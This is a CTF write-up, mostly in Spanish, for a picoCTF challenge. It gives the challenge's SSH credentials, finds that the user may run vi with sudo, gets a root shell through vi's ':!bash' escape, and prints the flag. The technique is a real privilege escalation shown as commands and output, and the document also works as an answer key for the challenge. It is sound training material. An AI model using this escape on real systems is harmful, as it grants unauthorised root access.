Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 63647 picoplayer@saturn.picoctf.net`Password: `e3pn6lmvHt`Can you login and read the root file?

Hints:
- What permissions do you have?

Solución
Una vez entrando podemos observar los permisos con sudo que tenemos:
```
picoplayer@challenge:~$ sudo -l 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
Con esto sabemos que tenemos permisos para ejecutar VI con sudo, y sabiendo que ahi se pueden ejecutar comandos de consola, podemos cambiar a root por ahi
Ejecutamos con sudo vi
```
picoplayer@challenge:~$ sudo vi
```
Y ahi dentro podemos ejecutar un comando para entrar a una consola de bash como root ya que en vi ya entramos con sudo
```
:!bash
```
Aplicamos y ya estamos como root, solo queda entrar a carpeta root y ver hacer un cat al archivo oculto de flag
```
root@challenge:/home/picoplayer# cd

root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Feb 19 22:14 .
drwxr-xr-x 1 root root   63 Feb 19 22:13 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  559 Feb 19 22:14 .viminfo

root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
```